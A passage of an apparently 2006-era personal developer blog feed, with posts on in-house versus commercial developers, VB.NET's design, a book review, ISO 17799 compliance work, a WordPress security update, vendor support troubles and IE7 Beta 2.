<p>This is a major step, and could have an interesting impact on the market. I&#8217;m wondering if we won&#8217;t see another Media Player vs. RealPlayer, or Internet Explorer vs. Netscape type battle (though at a smaller scale). By releasing this as a free product, they are walking into the same situation that has landed them in court several times before.</p>

<p>This could turn into a good show, might be worth watching to see what happens next.</p>

      <title>Superstars &amp; Monkeys</title>
      <description><p>I really enjoy what I do, and though I work in a chaotic environment, I really do love my job. Being in the Software Development industry has some really nice perks, being a developer in today&#8217;s world really is a great thing. Development isn&#8217;t easy though, it is quite mentally demanding; clear focus is of paramount importance. Without absolute focus, progress will only be a dream. This fact is a key player as to what makes being in this industry so great.</p>

<p>That is, if you aren&#8217;t a monkey.</p>

<p>In the time I&#8217;ve spent so far at my current company, I&#8217;ve come to understand just how clear the separation is of the two primary developer types. From all of my previous contracting work, I believed that the differences between the two sides of the fence were minimal. Wrong.</p>

<p><strong>The Fence </strong></p>

<p>There are, fundamentally, two types of developers:</p>

<ol>
<li><p>Monkeys - Developers that work as part of the IT department of a larger company.These developers create software primarily for internal use.</p></li>
<li><p>Superstars - Developers that build software that primarily used externally.These developers typically write software that is sold commercially.</p></li>
</ol>


<p>These two groups form the basis of the industry, and how the two are treated. While one could say that &#8220;a developer is a developer, right?&#8221; - That is not only quite wrong, it&#8217;s sadly misinformed. The line between the two is quite clear, at to me, clearer than ever.</p>

<p><strong>The Difference </strong></p>

<p>The difference between the two largely comes down to how they are treated, and the respect they receive. There is an entire list of small differences, here&#8217;s a few:</p>

<ul>
<li><p>Interruptions - Our monkeys tend to receive far more interruptions, providing a constant source of distractions. This causes the developer to achieve less productivity, and thus incur more pressure. The pressure typically comes in the form of increased distractions due to projects being late.</p></li>
<li><p>Creature Comforts - The superstars normally see more perks to make their life better, be it the very nice though oddly-shaped <a href="http://www.hermanmiller.com/aeron/">Aeron</a> chair (at a mere $900 each), or a retired <a href="http://adamcaudill.com/files/2006/03/36322071_9b4f668819_o.jpg">airplane wing</a> - just to spruce up the place. That&#8217;s not to mention simple things like higher end PCs, or decent desks. These are things that our monkeys often have to learn to live without, as the budget is far too tight to allow the extra spending.</p></li>
<li><p>Responsibilities - The monkeys in the industry often have far more projects that they own. This helps to contribute to the increases distractions, as well as further removing the ability to stay focused on a single task. With a dozen or more projects under a single developers ownership, the day-to-day issues of managing them all can be overwhelming.</p></li>
<li><p>Freedom - Superstars are often given a fair bit more freedom, both in what they work on, and in exploring new methods and technologies. This not only adds value for the company by staying on the cutting edge, but also for the developer. By staying on the cutting edge, it increases their marketability.</p></li>
</ul>


<p>These are just a few simple examples, there are many, many more.</p>

<p><strong>The Reason</strong></p>

<p>This is a complex yet simple question. The same applies to the answer, simple in that it can be summed up in 3 letters, yet complex in its ramifications. The answer: ROI.</p>

<p>One of the most basic business metrics, Return on Investment, this is the key to how many managers see the world. With superstars this is an easily defined number; simply compare your net projects to what you are paying the developers for that project. While that won&#8217;t give you a complete picture due to other costs involved (such as marketing &amp; support), it does give you a starting point.</p>

<p>The picture with the monkeys is quite different in that there doesn&#8217;t exist a clear way to establish ROI for a developer, when there is no profit connected to their work. While we could use estimates, such as the cost of hiring a consultant, though that would be highly inaccurate, and is thus mostly ignored.</p>

<p>This is the issue, if management can&#8217;t place a dollar value on the development work currently underway, they simply will not see any business value in giving the developers what they need. It&#8217;s just that simple.</p>

<p><strong>The Solution</strong></p>

<p>I honestly wish there was an answer here, but there isn&#8217;t. Management doesn&#8217;t seem to grasp the importance of internal development in many companies, and I can&#8217;t say I see a change coming. This requires upper-level management to change their mindset when it comes to the nature of creating software, and IT in general.</p>

<p>While it&#8217;s simple to sit here and explain what&#8217;s different and why, thinking of a way of leveling the playing field far less so. I&#8217;ve spent a fair bit of time trying to think of an answer, so far the only one that&#8217;s occurred to me is to either move to the other side of the fence, or become a consultant.</p>

<p><strong>The Conclusion</strong></p>

<p>This article, in its first draft, also included a few addition personal details that did add to the motivation to write this. Among these, were the details of the computer that I was given when I started my current job. The system was a small Dell PC, 1.3GHz, 256MB RAM, and to complete the package, a 15-inch monitor. There were quite a few other, similarly annoying, details as well. Thankfully, at least some of these have improved (still far from what <a href="http://www.joelonsoftware.com/items/2005/05/02.html">FogCreek</a> offers though); I&#8217;ve opted to remove that section in the interest of fairness.</p>

<p>Originally, I had intended this to be more of a scathing look at working as a monkey, this was changed in hopes of finding a middle ground, so that hopefully this article will generate some useful feedback on the problem, and how best to address it. I would appreciate any constructive comments on this, it&#8217;ll be interesting to see if there are any possible solutions (well, I&#8217;ll be happy with a step in the right direction).</p>

      <title>VB: The dumbing of a Great Language</title>
      <description><p>Visual Basic is at an interesting crossroads, it&#8217;s at a critical juncture between two paths. One path, it has followed since its earliest days, where simplicity and ease of use ruled over maintainability and solid design. The other, the longer, harder road, is that of design over ease. With the release of Visual Basic .NET, a major shift occurred in the direction the language is taking, though looking back now, nearly 5 years later, I&#8217;m finding myself concerned for the future of the language.</p>

<p>Before I go much further, let me give you some background so that you can have a clearer understanding of my perspective. I&#8217;m a VB developer, I work exclusively in Visual Basic, and quite honestly I do love the language. It&#8217;s productivity at it&#8217;s best. I started using VB5 and at some point, I&#8217;ve used every version since then. So while I will be saying some negative things about VB, this isn&#8217;t bashing the language, this is me trying to open people&#8217;s eyes to the state of a great language.</p>

<p><strong>The Problem</strong></p>

<p>The issues VB as a language is facing is the desire from Microsoft to keep long-time users around, while trying to advance the language. Instead of making a clean break, they are falling into the trap they fell into with Internet Explorer, where they continued to build on broken code, to ensure that thing would work the same way (the IE team is trying to <a href="http://blogs.msdn.com/ie/archive/2005/10/12/480242.aspx">get out of the hole</a>). This has resulted in a language that makes heavy use of crutches to prevent pre-.NET users from having to re-learn their language.</p>

<p>While backwards compatibility is a nice thing to offer, when you are making major changes to a language, sometimes it&#8217;s best to start over and break the mistakes of the past. I understood the forces at play when .NET was originally released, so it&#8217;s understandable that Microsoft would choose to add crutches to make the transition easier. All of 5 years and two versions latter, the picture doesn&#8217;t look any better.</p>

<p>I had hoped that the crutches included in .NET 1.0 &amp; Visual Basic 2002 were temporary and would fade out as new versions are released. Nope. Instead of removing this legacy support, they continue to add more as the marketing forces inside Microsoft push to get the remaining pre-.NET VB developers to migrate. This is the same thing that was being done with Internet Explorer, which when the next version, 7, is released, it will cause many web sites to either display improperly, or not function at all. They are breaking it to fix it, I&#8217;m afraid we&#8217;ll need to get to the same point with VB before it continues down the proper path.</p>

<p>As compatibility is continuously made a priority over good design, VB will continue to slip, and continue to carry the reputation the mistakes of the past gave it.</p>

<p>C# was created with a true, very logical OOP model, VB was developed with a concoction of the C# &amp; VB6 models, which is enforced by both the compiler and the Visual Studio IDE. These are not simply issues with the use of legacy methods, but the very model that the language is based on.</p>

<p><strong>Who&#8217;s To Blame</strong></p>

<p>Microsoft, of course.. right? Wrong.</p>

<p>The problem lies with the developers that use VB, not those that develop it. The primary issue I see is that legacy developers are not investing in the training or education to use VB properly. They continue to use antiquated methods and models they learned from VB6 and its predecessors.  The issue is that they create a hybrid type of code, that doesn&#8217;t follow a logical OOP model, instead following the pseudo-OOP model processed by VB6.</p>

<p>VB.NET has the potential to be a truly great language, the main issue is its habit of thinking for the developer, C# was developed without the mistakes of prior languages, and has so far done very well as it can take full advantage of the .NET Framework. VB on the other hand is somewhat limited in that due to trying to partially emulate the object model and structure of its predecessor, it loses flexibility granted to the other .NET languages.</p>

<p><strong>How to fix it</strong></p>

<p>Great question.</p>

<p>The only answer I see is to stop using legacy functionality, and calls for Microsoft to clean up the model used. When writing code in VB or C#, the IDE &amp; compilers should produce virtually identical code. As it stands now, there is a significant difference in the code the compiler generates, the assumptions it makes (many of which can <em>not</em> be over-ridden).</p>

<p>Until developers stand up, and take responsibility for using the language in the way it should be, I doubt we&#8217;ll see any progress. We can hope things will change, but I&#8217;m not holding my breath. (Though, as a side note, C# is looking more appealing every day.)</p>

      <description><p><a href="http://adamcaudill.com/files/1861006292.01._SCLZZZZZZZ_.jpg"><img src="http://adamcaudill.com/files/2006/03/1861006292.01._SCTZZZZZZZ_.jpg" alt="Advanced .NET Programming" /></a> <a href="http://www.amazon.com/exec/obidos/tg/detail/-/1861006292/">Advanced .NET Programming</a>,<br/>
by Simon Robinson</p>

<p>This is a book I picked on clearance at the local Books-A-Million, being targeted at the 1.0 release of the Framework I was aware it was rather dated, though it was still a decent looking book (and it was cheap). The author doesn&#8217;t jest when he uses the word <em>advanced</em>, this is an in-depth book.</p>

<p>While I tend to be forgiving of small typos in books, this book has an unforgivable number of errors. While much of the content is useful (and seems correct), there are enough editing issues to make me second-guess <em>everything</em>. With as many errors as I saw, I was almost wondering if was a test printing of the manuscript, though after some checking, that doesn&#8217;t seem to be the case. This book had the potential to be one of my favorites due to the way the author explains topics, and the vast amount of hard to find information included.</p>

<p>Yet, it leaves me disappointed.</p>

<p>I&#8217;d like to say that this is a book everyone should read, but due to countless editing errors, all this one is - is a &#8216;could have&#8217;</p>

      <title>1TB File Server, $500</title>
      <description><p>The price of storage has been steadily dropping over the last several years, and this is the latest example: <a href="http://www.informationweek.com/showArticle.jhtml?articleID=183702383">A Complete Terabyte File Server For About $500</a>  - Yep, you read that right, a custom 1TB file server, in the $500 range. While I&#8217;m not sure what I could do with that much storage (I remember saying that when I picked a 1.25GB drive over a 1.5GB, saying I&#8217;d never need it), but it&#8217;d be nice to have. :)</p>

<p>On the topic of cheap storage, I just purchased a <a href="http://www.newegg.com/Product/Product.asp?Item=N82E16822144701">250GB SATA</a>  drive to replace my 80GB data drive that&#8217;s almost full. With SATA drives under $100 for 250GB, I&#8217;m tempted to try my own version of his project.</p>

      <title>MCTS</title>
      <description><p>I think I&#8217;ve set myself up for an interesting adventure, I&#8217;ve decided to shoot for the <a href="http://www.microsoft.com/learning/mcp/mcts/winapps/">MCTS</a>, also known as &#8220;Microsoft Certified Technology Specialist&#8221; - and I&#8217;ll be taking the tests without a single guide book. Yep, you heard that right, no test study guide. Now, if I were you, I&#8217;d be asking &#8220;Why?!&#8221; - well, <em>there are none</em>. The tests required for the MCTS are so new, no books have been published on them.</p>

<p>I&#8217;ll be working with one of my co-workers, Laura, on this, our plan is simple: <em>Learn everything there is to know about VB.NET 2005</em>. I think that should about cover anything on the test.</p>

<p>Seriously, we are going to start by studying &#8221;<a href="ttp://www.amazon.com/gp/product/0735621837/">Programming Microsoft Visual Basic 2005: The Language</a>,&#8221; one of the recommend Microsoft references for the test. We may look at another book or two, but right now I think this is the only one we&#8217;ll need. I&#8217;d like to get my hands on a copy of &#8221;<a href="http://www.amazon.com/gp/product/0735622779/">MCTS Self-Paced Training Kit</a>&#8221; - but that won&#8217;t be available till July, and I&#8217;m hoping to have passed the tests by then (<a href="http://www.microsoft.com/learning/mcp/offers/2ndchance/details/">this is why</a>).</p>

<p>Wish me luck, somehow I think I&#8217;ll need it.</p>

      <title>Server Move</title>
      <description><p>This site now has a new home, on a Linux/Apache box where it should have been from the beginning. When I built this site, I put it on my Windows server with the idea I&#8217;m slowly move to an ASP.NET solution, away from WordPress. Well, after realizing what I was missing (i.e. .htaccess files) I decided to go ahead and move it to my Linux server.</p>

<p>This will allow for some nice changes, here&#8217;s a couple:</p>

<ul>
<li><p>Better link structure. - The site now uses a cleaner, easier to understand link structure. Instead of seeing something like &#8220;p=25&#8221; - you&#8217;ll see &#8220;2006/03/19/iso-17799/&#8221;</p></li>
<li><p>Now using the non-www version of the domain exclusively. Normally I only use the www version of the domain, but Google has so for only indexed the non-www variant, so that&#8217;s what I&#8217;ll use.</p></li>
<li><p>Easier to maintain &amp; update. Due to some issues with FTP &amp; the Windows server, tweaking things has been a pain. Now that I&#8217;m back on my trusty Linux box, it&#8217;ll be a lot easier to tweak things to get them just how they should be.</p></li>
</ul>


<p>This change should also allow for more new features to be added as time goes on. I may start porting some of my old PHP tools to work with the WordPress structure and make those available again.</p>

<p>If you see anything wrong, please let me know. I think I covered everything in the move, but it&#8217;s possible I missed something, if so, please let me know.</p>

      <title>Move to Outlook</title>
      <description><p>I just completed doing something I said I never would, I switched from <a href="http://www.ritlabs.com/en/products/thebat/">The Bat!</a> to Outlook. While I&#8217;ll remain a big fan of The Bat! for its great features, using it at home, while using Outlook at work was just driving me up the wall. The two clients are about as opposite as two programs can be. The very concept behind how you use them, and how you organize you data is quite different.</p>

<p>Over the course of the last week, I&#8217;ve completed moving almost 20,000 emails into Outlook, then creating nearly 100 filters to organize it all again. This was a somewhat painful experience, but I can certainly appreciate some of the features (such as sorting) that Outlook 2003 offers.</p>

      <title>ISO 17799</title>
      <description><p>Certifications are good things, or so I&#8217;ve always thought. Though the more work I do to help achieve <a href="http://en.wikipedia.org/wiki/ISO_17799">ISO 17799</a>  compliance, I&#8217;m beginning to dislike them. This has been steadily adding work since I started this job in December, but now that we are only a couple weeks away from what should be our final audit, the work is coming a lot faster. We&#8217;re working to ensure everything we have in production meets the requirements of the standard, which has proved to be rather difficult.</p>

<p>The primary issue has been in data access, eliminating all direct SQL queries, and replacing them with stored procedures. While this isn&#8217;t that difficult, when there are dozens of systems that need updates, it adds up surprisingly quick.</p>

<p>Security is always a good thing, and when dealing with sensitive personal information of thousands of people, it&#8217;s very important. So I&#8217;m not complaining about the security required, but when you are trying to cleanup from years of more relaxed practices, it takes a surprising amount of work.</p>

      <title>End on an Era</title>
      <description><p>Magazines are great, I really like just being able to pick one up, lay back and do some reading. Development magazines, not so great. They tend to have a higher price, far less content, and more ad pages than content pages. Eric Sink think <a href="http://software.ericsink.com/entries/Magazines_Dying.html">they are dying</a>, and based on <a href="http://www.ddj.com/documents/s=8903/ddj1142366567743/ddj060314news.html">the announcement</a> that &#8220;Software Development&#8221; is being dissolved, looks like he&#8217;s right.</p>

<p>It&#8217;s too bad really, I almost hate to see them go, but I have to ask, do they really have any relevance in the modern development world?</p>

      <title>Where&#39;s the service?</title>
      <description><p>When I buy something, I expect support. When I buy something expensive, I expect really good support. That may be asking too much, but that&#8217;s just how I think. Now, when I contact the vendor for support, I expect to talk to somebody that understands the product. When I bring up an issue that gets me on a conference call with a Vice President and a Project Manager, I expect them to give me accurate data.</p>

<p>Seems not everybody thinks that way.</p>

<p>We recently installed a new communications system at work, this is basically two servers (one was an old database server we already had), and a bunch of wires. This $40,000 gadget manages our phone systems, one of its components is a <em>$14,000</em> reporting system (that&#8217;s what the old DB server was used for). This reporting system is a rather complex bit of software, one that I&#8217;ve spent the last 5 weeks trying to figure out.</p>

<p>When I first heard we were installing this system, I was rather excited as it uses MS SQL Server as a back-end, so writing custom reports should be easy. So I dug into the (limited) documentation and set to work. After a couple days I had everything in place for my most important reporting project (it&#8217;s used to report details for part of a major banks customer service department). After a few bumps, it was done and was a bit of a hero for getting it running so quickly.</p>

<p>There were several more bumps on the road, most due to odd, conflicting, or confusing data, but it looked like we were slowly getting there. About a week ago, an issue was brought to my attention, one of the numbers looked wrong, so I dug into the data deeper than ever. I almost had a heart attack. Two of the most important items on the report were wrong, wrong by almost 50%. Not good.</p>

<p>So several phone calls later, we hit a dead end, we just can&#8217;t get any answers. So one of our executives asked if we had cut the check for the system, turns out we hadn&#8217;t. So the word went out to not pay until we could get some answers. Not too surprisingly, when the vendor found out we hand no intention of paying until it was working properly, they finally agreed to give us what we were asking for: answers.</p>

<p>Those answers came in the form of a conference call with a Vice President and Project Manager from the company that created the software, if anybody understood this software, it would be them. I guess luck wasn&#8217;t on our side. Of all the information we gathered from them (and confirmed more today), here&#8217;s the parts that matter:</p>

<ul>
<li><p>The documentation is completely wrong</p></li>
<li><p>They don&#8217;t understand the settings for their own product</p></li>
<li><p>They don&#8217;t truly understand how their own product works</p></li>
<li><p>They can&#8217;t answer a question without first blaming it on something else</p></li>
</ul>


<p>Somehow, I was hoping for real answers, not  more clueless people.</p>

<p>After spending $14,000 on the system, as of yesterday, they wanted another $27,000 to create reports and add-ons to do what was promised when we bought it. That&#8217;s doesn&#8217;t include any user training, or the thousands we lost due to under billing because of the bad data.</p>

<p>I expect good support, seems not everybody thinks that way.</p>

      <title>Common Sense Email</title>
      <description><p>While reading a post on <a href="http://www.paulstovell.net/Posts/Post.aspx?postId=aae38564-acd9-4601-9b09-2252598f55f1">Paul&#8217;s</a> blog, I came across a rather interesting guide to &#8220;better email&#8221; - while I tend to disagree with ever deleting an email as author suggests often, this looks like a worthy read.</p>

      <title>WordPress Update</title>
      <description><p>Yesterday the WordPress team <a href="http://wordpress.org/development/2006/03/security-202/">announced</a> a new version of WordPress, the blogging software that powers this site, that resolves a couple security issues. So me, being the security conscious  person that I am, decided I had to upgrade, that was a <em>two hour</em> adventure.</p>

<p>Due to some of the unique aspects of my theme, I&#8217;ve had to modify some of the core WordPress files, that turned out to be a bad idea. I had to convert all of the PHP &amp; JS files to DOS format (after finding a Windows version of unix2dos) and then convert the diff file to DOS format, then the patching began. Getting the patch to apply to my modified files turned out to be an interesting experience, to say the least. Though after about 30 minutes of tweaking, the patch finally applied cleanly.</p>

<p>All in all, it took a little more than two hours, but now I&#8217;m secure again. :)</p>

      <title>The Magician</title>
      <description><p><a href="http://rentacoder.com/RentACoder/misc/BidRequests/ShowBidRequest.asp?lngBidRequestId=423023">Rent-A-Coder</a> attracts all types, to that I&#8217;m sure everybody can agree. It not only receives traffic from legitimate users seeking professional assistance and are willing to pay for it, but also from people seeking code gurus that work for peanuts. This is a case where even peanuts might be asking a bit much.</p>

<p>Here&#8217;s the vital details:</p>

<ul>
<li><p>ASP-based solution.</p></li>
<li><p>Converts HTML to a PDF file.</p></li>
<li><p>Does not require the end user to have Acrobat installed.</p></li>
<li><p>Can be completed in two hours.</p></li>
</ul>


<p>This project is flagged as an emergency, with a requested turn-around of <em>two hours</em>. Not leaving much time is he? The other note is that the page should generate a PDF, yet doesn&#8217;t require Acrobat be installed to view this file. That&#8217;s going to be a challenge.</p>

<p>Now we come to the <em>piece de resistance</em>, the price: To quote our requester:</p>

<blockquote><p>&#8220;as this is small job i will pay only 10 $&#8221;</p></blockquote>

<p>What do people think, that we can work magic?!</p>

      <title>New Windows XP Theme</title>
      <description><p>I&#8217;ve stumbled upon a great new XP Theme (actually from Windows Media Centre 2005), seems this has been around for a while as a modified version of the WMC theme, though it&#8217;s now been officially released by Microsoft for XP.</p>

<p>It&#8217;s certainly worth the <a href="http://www.microsoft.com/downloads/details.aspx?FamilyID=15373C73-D5F6-4AF0-B583-D633CB021612&amp;displaylang=en">download</a>.</p>

      <title>It&#39;s Official - IE7 is cool</title>
      <description><p>Today I decided to go ahead and install IE 7 Beta 2, expecting of the ugly browser I dealt with while using Beta 1, <a href="http://www.adamcaudill.com/files/sc307493720.png">this</a> is what I found instead. After so long with IE as the &#8220;ugly duckling&#8221; of the browsing world, the Internet Explorer team seems to have built something with some degree of quality. While there&#8217;s still a lot needed to secure its weakening position in the market, this will have a real impact.</p>

<p><strong>Finally Modern</strong></p>

<p>IE has been on a slow decline for so long due to Microsoft&#8217;s unwillingness (or inability) to even keep up the it&#8217;s competitors innovations, much less come up with an original idea. These changes are going to represent a huge step forward for IE, and it&#8217;s market domination. It&#8217;s about time that the powers that be in Redmond open there eyes.</p>

<p><strong>To little to late?</strong></p>

<p>&#8220;Is this enough?&#8221; - I&#8217;m asking myself as I write this, will this save IE and end the browser war? Or, perhaps users are now educated enough in the existence of options to still choice what works best? If MS moves fast enough, I think this will slow the trend of moving away for IE to Firefox &amp; Opera, but will it save IE in the long run?</p>

<p>Firefox &amp; Opera are both a generation ahead of IE, and still gaining. This new version will have a profound impact in the near future, but will Microsoft continue to invest in keeping up? They&#8217;ve poured considerable resources into this update, the question is, will they keep it up after IE 7 goes gold?</p>

<p>Their competitors will, to that there is no question, this poses a real test for Microsoft, not in power or money - but in the willpower to fund a product that they give away. I guess it comes down to a simple question: What&#8217;s market domination worth?</p>

      <title>Starting Over</title>
      <description><p>This is the fifth major starting-over of my personal site. This one is different though, this time I&#8217;m really starting over. Very little of what you see here is from my older sites. I felt it was time for a clean break, and this is part of it.</p>

<p>This is a blend of a professional &amp; personal blog, you&#8217;ll see a dynamic mix of connect (or basically: whatever strikes my fancy). This is a change from the past, where I committed to be one or the other, but not both. I&#8217;ll keep this short, as there&#8217;s more to be told later, but this is just to let you all know, <strong>I&#8217;m still alive</strong>.</p>
